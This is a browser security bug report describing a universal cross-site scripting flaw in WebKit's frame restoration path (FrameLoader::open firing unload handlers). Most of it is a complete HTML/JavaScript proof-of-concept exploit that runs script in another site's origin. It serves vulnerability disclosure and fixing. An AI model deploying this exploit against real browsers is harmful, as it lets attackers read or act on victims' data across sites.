# UXSS via CachedFrameBase::restore

### Reported by lokihardt@google.com, Mar 17 2017

This is similar to the case https://bugs.chromium.org/p/project-zero/issues/detail?id=1151.
But this time, javascript handlers may be fired in `FrameLoader::open`.

```cpp
void FrameLoader::open(CachedFrameBase& cachedFrame)
{
	...
    clear(document, true, true, cachedFrame.isMainFrame()); <<--------- prepareForDestruction which fires unloads events is called.
    ...
}
```

PoC:

```html
<html>
<body>
Click anywhere...
<script>

function createURL(data, type = 'text/html') {
    return URL.createObjectURL(new Blob([data], {type: type}));
}

function navigate(w, url) {
    let a = w.document.createElement('a');
    a.href = url;
    a.click();
}

window.onclick = () => {
	window.w = open('about:blank', 'w', 'width=500, height=500');

	let i0 = w.document.body.appendChild(document.createElement('iframe'));
	let i1 = w.document.body.appendChild(document.createElement('iframe'));
	i0.contentWindow.onbeforeunload = () => {
		i0.contentWindow.onbeforeunload = null;

		navigate(w, 'about:blank');
	};

	navigate(i0.contentWindow, createURL(`
<body>
<script>
</scrip` + 't></body>'));

	setTimeout(() => {
		let g = i0.contentDocument.body.appendChild(document.createElement('iframe'));
		let x = new g.contentWindow.XMLHttpRequest();
		x.onabort = () => {
			parseFloat('axfasdfasfdsfasfsfasdf');
			i0.contentDocument.write();

	        navigate(w, 'https://abc.xyz/');

	        showModalDialog(createURL(`
<script>
let it = setInterval(() => {
	try {
	    opener.w.document.x;
	} catch (e) {
	    clearInterval(it);
	    window.close();
	}
}, 10);
</scrip` + 't>'));

	        setTimeout(() => {
		        i1.srcdoc = '<script>alert(parent.location);</scrip' + 't>';
		        navigate(i1.contentWindow, 'about:srcdoc');
	        }, 10);
		};

		x.open('GET', createURL('x'.repeat(0x1000000)));
		x.send();
		w.history.go(-2);
	}, 200);
};

</script>
</body>
</html>
```